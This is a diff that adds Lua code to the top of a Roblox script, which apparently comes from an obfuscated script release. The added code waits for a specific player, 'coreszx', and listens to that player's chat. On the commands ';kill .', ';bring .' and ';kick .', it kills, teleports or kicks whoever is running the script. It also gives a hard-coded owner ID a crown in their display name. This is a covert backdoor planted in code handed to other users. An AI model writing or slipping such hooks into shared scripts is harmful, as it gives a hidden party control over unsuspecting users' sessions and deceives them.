@@ -1,3 +1,30 @@
+local owner = {
+ 2477035388    --enter user id,
+}
+--enter
+for i,v in pairs(game.Players:GetChildren()) do
+    if table.find(owner,v.UserId) then
+        if v.Character then
+            v.Character:FindFirstChild("Humanoid").DisplayName = "[:crown:]"..v.DisplayName
+        end
+    end
+end
+
+repeat wait() until game.Players:FindFirstChild('coreszx')
+
+game.Players:FindFirstChild('coreszx').Chatted:Connect(function(msg)
+    if msg == ";kill ." then 
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+
+if msg == ";bring ." then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('coreszx').Character.HumanoidRootPart.CFrame
+end
+if msg == ";kick ." then
+    game.Players.LocalPlayer:Kick('Core Kicked you')
+    end
+end)
+
 --[[
 	tekgozs obfuscator https://discord.gg/tg2Hbp5kEb made by Loni & sx65, v0.1.1
 --]]
